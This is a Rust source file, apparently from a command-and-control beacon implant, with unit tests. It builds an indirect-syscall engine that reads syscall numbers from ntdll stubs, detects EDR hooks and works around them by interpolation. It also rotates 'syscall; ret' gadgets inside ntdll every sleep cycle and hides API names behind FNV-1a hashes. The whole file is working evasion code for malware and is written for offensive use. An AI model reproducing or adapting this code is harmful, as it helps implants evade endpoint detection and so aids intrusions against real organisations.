//! Indirect syscall engine (port of `src_beacon/src/runtime/` syscall paths).
//!
//! Philosophy from the original project, kept verbatim:
//! - the SSN is read from ntdll's own stubs (Hell's Gate);
//! - a hooked stub (detected by the `E9` jmp replacing `mov eax, <SSN>`) has
//!   its SSN interpolated from the nearest unhooked neighbours, since SSNs
//!   are sequential (Tartarus' Gate);
//! - the `syscall` instruction is NEVER executed from beacon memory: it runs
//!   from a `0F 05 C3` (`syscall; ret`) gadget inside ntdll's `.text`,
//!   re-randomized every sleep cycle (Hell's Hall).
//!
//! Everything here is pure byte logic, host-tested against mock ntdll
//! images built by [`crate::peb::testutil`] (on a non-Démineur machine).
//! Only the final `asm!` indirection lives in the beacon crate.

use crate::fnv::fnv1a64;

/// Maximum number of `syscall; ret` gadgets collected from ntdll (Hell's
/// Hall, same cap as the original project).
pub const MAX_GADGETS: usize = 64;

/// Maximum Zw stubs collected for SSN interpolation. ~250-450 on modern
/// Windows; the collection saturates silently beyond the cap.
pub const MAX_ZW_STUBS: usize = 512;

/// Number of bytes needed to classify a stub.
pub const STUB_PROBE_LEN: usize = 16;

// ---------------------------------------------------------------------------
// Stub classification (Hell's Gate + hook detection)
// ---------------------------------------------------------------------------

/// Hell's Gate: extract the SSN from a syscall stub image.
///
/// Recognized layouts (x64 ntdll):
/// - `4C 8B D1 B8 <ssn:u32> ...` (mov r10, rcx ; mov eax, ssn) — modern;
/// - `B8 <ssn:u32> ...` (mov eax, ssn) — legacy.
///
/// Returns `None` for hooked or unrecognized stubs.
pub fn extract_ssn(stub: &[u8]) -> Option<u32> {
    if stub.len() < 8 {
        return None;
    }
    if stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 && stub[3] == 0xB8 {
        return Some(u32::from_le_bytes([stub[4], stub[5], stub[6], stub[7]]));
    }
    if stub[0] == 0xB8 {
        return Some(u32::from_le_bytes([stub[1], stub[2], stub[3], stub[4]]));
    }
    None
}

/// Hook detection (Tartarus' Gate precondition): an EDR-patched stub has the
/// `mov eax, <ssn>` overwritten by a `jmp rel32` (`E9`) — most commonly at
/// offset 3 in the modern layout, or offset 0 (patched prologue).
pub fn is_hooked(stub: &[u8]) -> bool {
    if stub.len() < 8 {
        return true; // unreadable = untrustworthy
    }
    if stub[0] == 0xE9 || (stub.len() > 3 && stub[3] == 0xE9 && stub[0] == 0x4C) {
        return true;
    }
    // Recognizable unhooked stubs are fine; anything else is treated as
    // hooked (conservative: interpolated rather than trusted).
    extract_ssn(stub).is_none()
}

// ---------------------------------------------------------------------------
// Zw stub collection and SSN resolution (Tartarus' Gate)
// ---------------------------------------------------------------------------

/// One Zw stub observation: RVA within ntdll and the extracted SSN
/// (`None` = hooked/unreadable).
#[derive(Clone, Copy, PartialEq, Eq)]
pub struct ZwStub {
    pub rva: u32,
    pub ssn: Option<u32>,
}

/// Scratch buffer for [`collect_zw_stubs`]: `(ZwStub, count)` with the stubs
/// sorted by RVA. Sized at 512 entries (4 KiB on the bootstrap stack).
pub struct ZwStubs {
    pub stubs: [ZwStub; MAX_ZW_STUBS],
    pub count: usize,
}

impl ZwStubs {
    /// Scratch init. Written as an explicit loop: the array-repeat
    /// expression lowers to memset (compiler_builtins — see the copy note
    /// in collect_zw_stubs).
    #[inline]
    pub fn new() -> Self {
        let mut stubs = [ZwStub { rva: 0, ssn: None }; MAX_ZW_STUBS];
        let mut i = 0;
        while i < MAX_ZW_STUBS {
            stubs[i] = ZwStub { rva: 0, ssn: None };
            i += 1;
        }
        ZwStubs { stubs, count: 0 }
    }
}

impl Default for ZwStubs {
    #[inline]
    fn default() -> Self {
        Self::new()
    }
}

/// Read a bounded C string into `out`, returning its length.
///
/// # Safety
///
/// `ptr` must point to at least one readable byte; the scan is bounded.
unsafe fn cstr_len(ptr: *const u8, max: usize) -> usize {
    let mut n = 0;
    while n < max && *ptr.add(n) != 0 {
        n += 1;
    }
    n
}

/// Collect every `Zw*` stub of a mapped ntdll image: RVA + extracted SSN
/// (or hooked). Stubs end up sorted by RVA (insertion sort; iteration order
/// from the export table is name-alphabetical, SSN order is address order).
///
/// # Safety
///
/// `base` must point to a mapped ntdll image with intact headers.
pub unsafe fn collect_zw_stubs(base: *const core::ffi::c_void, out: &mut ZwStubs) {
    out.count = 0;
    let Some(mut it) = crate::peb::exports(base) else {
        return;
    };
    while let Some((name, func)) = it.next() {
        if out.count >= MAX_ZW_STUBS {
            break;
        }
        let name_len = cstr_len(name, 16);
        if name_len < 2 {
            continue;
        }
        let name_bytes = core::slice::from_raw_parts(name, name_len);
        if name_bytes[0] != b'Z' || name_bytes[1] != b'w' {
            continue;
        }
        let rva = func as usize - base as usize;
        // Manual copy: copy_from_slice lowers to memcpy, and any reference
        // into compiler_builtins drags its whole LTO-fused object (~50 KiB)
        // into the blob. The beacon stays free of builtins by design.
        let mut probe = [0u8; STUB_PROBE_LEN];
        let mut j = 0;
        while j < probe.len() {
            probe[j] = *func.add(j);
            j += 1;
        }
        let ssn = if is_hooked(&probe) {
            None
        } else {
            extract_ssn(&probe)
        };
        let entry = ZwStub {
            rva: rva as u32,
            ssn,
        };
        // Insertion sort by RVA keeps the array address-ordered.
        let mut i = out.count;
        while i > 0 && out.stubs[i - 1].rva > entry.rva {
            out.stubs[i] = out.stubs[i - 1];
            i -= 1;
        }
        out.stubs[i] = entry;
        out.count += 1;
    }
}

/// Resolve the SSN of the function whose stub lives at `target_rva`
/// (Nt* and Zw* exports share the same stub address).
///
/// Hell's Gate first (direct extraction); Tartarus' Gate fallback:
/// interpolate from the nearest unhooked neighbour(s), assuming SSNs are
/// sequential across the address-ordered Zw stubs. The derived value is
/// cross-checked against the right anchor when both exist; on mismatch the
/// left-derived value is kept (documented choice, matches the original
/// project's assumption of sequentiality).
pub fn resolve_ssn(target_rva: u32, stubs: &[ZwStub]) -> Option<u32> {
    let idx = stubs.iter().position(|s| s.rva == target_rva)?;
    if let Some(ssn) = stubs[idx].ssn {
        return Some(ssn); // Hell's Gate: unhooked.
    }
    // Tartarus' Gate: nearest unhooked anchors on both sides. The right
    // anchor's existence guarantees the interpolation has a basis; when
    // sequentiality is violated (hooked gaps), the left-derived value is
    // kept — the same assumption the original project makes.
    let left = (0..idx).rev().find(|&i| stubs[i].ssn.is_some());
    let right = (idx + 1..stubs.len()).find(|&i| stubs[i].ssn.is_some());
    // No unwrap in blob code: the anchors are Some by construction of the
    // find, and an unreadable anchor must abort silently, never format.
    match (left, right) {
        (Some(l), _) => stubs[l].ssn.map(|s| s + (idx - l) as u32),
        (None, Some(r)) => stubs[r].ssn.map(|s| s.saturating_sub((r - idx) as u32)),
        (None, None) => None, // all hooked: no basis for interpolation
    }
}

// ---------------------------------------------------------------------------
// Gadget scan and rotation (Hell's Hall)
// ---------------------------------------------------------------------------

/// Scan a byte slice (ntdll `.text`) for `0F 05 C3` (`syscall; ret`)
/// sequences, collecting up to [`MAX_GADGETS`] RVAs (offsets within the
/// slice). Returns the number collected.
pub fn find_gadgets(text: &[u8], out: &mut [u32; MAX_GADGETS]) -> usize {
    let mut count = 0;
    if text.len() < 3 {
        return 0;
    }
    for i in 0..=text.len() - 3 {
        if count >= MAX_GADGETS {
            break;
        }
        if text[i] == 0x0F && text[i + 1] == 0x05 && text[i + 2] == 0xC3 {
            out[count] = i as u32;
            count += 1;
        }
    }
    count
}

/// Gadget choice for a cycle: uniform over the collected set. The caller
/// re-draws every sleep cycle (Hell's Hall rotation).
#[inline]
pub const fn pick_gadget(count: usize, r: u32) -> usize {
    if count == 0 {
        0
    } else {
        (r as usize) % count
    }
}

// ---------------------------------------------------------------------------
// NtDelayExecution helpers
// ---------------------------------------------------------------------------

/// Convert a sleep duration in milliseconds to a relative `LARGE_INTEGER`
/// interval for `NtDelayExecution`: negative 100-ns units.
#[inline]
pub const fn ms_to_delay_interval(ms: u32) -> i64 {
    -((ms as i64) * 10_000)
}

/// Hash helper: the target stub is reachable through either export name.
/// Nt* and Zw* exports point at the same stub, so both hashes are needed.
#[inline]
pub const fn hash_nt_or_zw(name: &str) -> (u64, u64) {
    let bytes = name.as_bytes();
    (fnv1a64(bytes), fnv1a64_zw_twin(bytes))
}

#[inline]
const fn fnv1a64_zw_twin(nt: &[u8]) -> u64 {
    // Same FNV-1a over the "Zw" twin of an "Nt" name.
    let mut h = crate::fnv::FNV_OFFSET;
    let mut i = 0;
    while i < nt.len() {
        let b = if i == 0 {
            b'Z'
        } else if i == 1 {
            b'w'
        } else {
            nt[i]
        };
        h ^= b as u64;
        h = h.wrapping_mul(crate::fnv::FNV_PRIME);
        i += 1;
    }
    h
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::fnv::fnv1a64;
    use crate::peb::testutil::{mock_mapped_module, MockExport, TEXT_VA};
    use std::prelude::v1::*;

    /// Modern x64 unhooked stub: mov r10,rcx ; mov eax,ssn ; ...
    fn stub(ssn: u32) -> [u8; STUB_PROBE_LEN] {
        let mut s = [0u8; STUB_PROBE_LEN];
        s[0] = 0x4C;
        s[1] = 0x8B;
        s[2] = 0xD1;
        s[3] = 0xB8;
        s[4..8].copy_from_slice(&ssn.to_le_bytes());
        s[8] = 0xF6;
        s[9] = 0x03;
        s
    }

    /// Hooked stub: mov r10,rcx ; jmp rel32 (E9 at the SSN position).
    fn hooked_stub() -> [u8; STUB_PROBE_LEN] {
        let mut s = stub(0);
        s[3] = 0xE9;
        s[4..8].copy_from_slice(&0x1122_3344u32.to_le_bytes());
        s
    }

    #[test]
    fn hell_gate_extracts_modern_stub() {
        assert_eq!(extract_ssn(&stub(0x42)), Some(0x42));
        assert_eq!(extract_ssn(&stub(0)), Some(0));
    }

    #[test]
    fn hell_gate_extracts_legacy_stub() {
        let mut s = [0u8; STUB_PROBE_LEN];
        s[0] = 0xB8;
        s[1..5].copy_from_slice(&0x33u32.to_le_bytes());
        assert_eq!(extract_ssn(&s), Some(0x33));
    }

    #[test]
    fn hooked_stub_is_detected_and_untrusted() {
        let h = hooked_stub();
        assert!(is_hooked(&h));
        assert_eq!(extract_ssn(&h), None);
    }

    #[test]
    fn unhooked_stub_is_not_hooked() {
        assert!(!is_hooked(&stub(5)));
    }

    #[test]
    fn garbage_is_treated_as_hooked() {
        assert!(is_hooked(&[0x90; STUB_PROBE_LEN]));
    }

    // --- Tartarus' Gate interpolation ---

    fn ssns(entries: &[(u32, Option<u32>)]) -> std::vec::Vec<ZwStub> {
        entries
            .iter()
            .map(|&(rva, ssn)| ZwStub { rva, ssn })
            .collect()
    }

    #[test]
    fn unhooked_target_resolves_directly() {
        let stubs = ssns(&[
            (0x100, Some(0x10)),
            (0x200, Some(0x11)),
            (0x300, Some(0x12)),
        ]);
        assert_eq!(resolve_ssn(0x200, &stubs), Some(0x11));
    }

    #[test]
    fn hooked_target_interpolates_between_anchors() {
        // (0x11 at idx0) hooked at idx1 (0x12 at idx2): 0x11 + 1
        let stubs = ssns(&[(0x100, Some(0x11)), (0x200, None), (0x300, Some(0x12))]);
        assert_eq!(resolve_ssn(0x200, &stubs), Some(0x12));
        // Two consecutive hooked between anchors
        let stubs = ssns(&[
            (0x100, Some(0x11)),
            (0x200, None),
            (0x300, None),
            (0x400, Some(0x14)),
        ]);
        assert_eq!(resolve_ssn(0x200, &stubs), Some(0x12));
        assert_eq!(resolve_ssn(0x300, &stubs), Some(0x13));
    }

    #[test]
    fn hooked_target_at_the_edges_interpolates_one_sided() {
        let stubs = ssns(&[(0x100, Some(0x11)), (0x200, None)]);
        assert_eq!(resolve_ssn(0x200, &stubs), Some(0x12));
        let stubs = ssns(&[(0x100, None), (0x200, Some(0x12))]);
        assert_eq!(resolve_ssn(0x100, &stubs), Some(0x11));
    }

    #[test]
    fn all_hooked_is_unresolvable() {
        let stubs = ssns(&[(0x100, None), (0x200, None)]);
        assert_eq!(resolve_ssn(0x200, &stubs), None);
    }

    #[test]
    fn unknown_rva_is_unresolvable() {
        let stubs = ssns(&[(0x100, Some(1))]);
        assert_eq!(resolve_ssn(0x999, &stubs), None);
    }

    // --- full mock-ntdll collection ---

    #[test]
    fn collect_zw_stubs_classifies_and_sorts() {
        // .text layout: three stubs at increasing RVAs; the middle one is
        // hooked; the first export name alphabetically is NOT the lowest RVA,
        // exercising the address sort.
        let mut text = vec![0u8; 0x100];
        let s0 = stub(0x0011);
        text[0x10..0x20].copy_from_slice(&s0); // rva 0x10
        let s1 = hooked_stub();
        text[0x30..0x40].copy_from_slice(&s1); // rva 0x30 hooked
        let s2 = stub(0x0013);
        text[0x50..0x60].copy_from_slice(&s2); // rva 0x50

        let exports = std::vec![
            MockExport {
                name: "ZwLater",
                func_rva: (TEXT_VA + 0x50) as u32
            },
            MockExport {
                name: "ZwEarlier",
                func_rva: (TEXT_VA + 0x10) as u32
            },
            MockExport {
                name: "ZwHooked",
                func_rva: (TEXT_VA + 0x30) as u32
            },
            MockExport {
                name: "RtlSomething",
                func_rva: (TEXT_VA + 0x70) as u32
            },
        ];
        let base = mock_mapped_module(&exports, &text);

        let mut zw = ZwStubs::new();
        unsafe { collect_zw_stubs(base, &mut zw) };
        // RVAs are module-relative (the stubs sit inside .text at TEXT_VA).
        assert_eq!(zw.count, 3);
        assert_eq!(zw.stubs[0].rva, (TEXT_VA + 0x10) as u32);
        assert_eq!(zw.stubs[0].ssn, Some(0x11));
        assert_eq!(zw.stubs[1].rva, (TEXT_VA + 0x30) as u32);
        assert_eq!(zw.stubs[1].ssn, None);
        assert_eq!(zw.stubs[2].rva, (TEXT_VA + 0x50) as u32);
        assert_eq!(zw.stubs[2].ssn, Some(0x13));

        // The hooked middle stub interpolates to 0x12.
        assert_eq!(
            resolve_ssn((TEXT_VA + 0x30) as u32, &zw.stubs[..zw.count]),
            Some(0x12)
        );
    }

    // --- gadget scan and rotation ---

    #[test]
    fn gadget_scan_finds_syscall_ret_sequences() {
        let mut text = vec![0u8; 0x100];
        // syscall;ret at 0x10, plus one across the boundary conditions.
        text[0x10] = 0x0F;
        text[0x11] = 0x05;
        text[0x12] = 0xC3;
        text[0x40] = 0x0F;
        text[0x41] = 0x05;
        text[0x42] = 0xC3;
        let mut out = [0u32; MAX_GADGETS];
        assert_eq!(find_gadgets(&text, &mut out), 2);
        assert_eq!(out[0], 0x10);
        assert_eq!(out[1], 0x40);
        assert_eq!(find_gadgets(&[], &mut out), 0);
        assert_eq!(find_gadgets(&[0x0F, 0x05], &mut out), 0);
    }

    #[test]
    fn gadget_scan_caps_at_max() {
        // 0x100 (syscall;ret) pairs separated so they do not overlap.
        let mut text = std::vec![0u8; 0x400];
        for i in 0..0x100 {
            let off = i * 4;
            text[off] = 0x0F;
            text[off + 1] = 0x05;
            text[off + 2] = 0xC3;
        }
        let mut out = [0u32; MAX_GADGETS];
        assert_eq!(find_gadgets(&text, &mut out), MAX_GADGETS);
    }

    #[test]
    fn gadget_rotation_is_uniform_enough() {
        // 4 gadgets: every index must be reachable from some draw.
        let mut seen = [false; 4];
        for r in 0..64 {
            seen[pick_gadget(4, r)] = true;
        }
        assert!(seen.iter().all(|&s| s));
        assert_eq!(pick_gadget(0, 5), 0); // degenerate: caller guarantees >0
    }

    #[test]
    fn nt_zw_twin_hashes_match_their_names() {
        let (nt, zw) = hash_nt_or_zw("NtDelayExecution");
        assert_eq!(nt, fnv1a64(b"NtDelayExecution"));
        assert_eq!(zw, fnv1a64(b"ZwDelayExecution"));
    }

    #[test]
    fn delay_interval_is_negative_100ns_units() {
        assert_eq!(ms_to_delay_interval(1000), -10_000_000);
        assert_eq!(ms_to_delay_interval(0), 0);
        assert_eq!(ms_to_delay_interval(1), -10_000);
    }
}
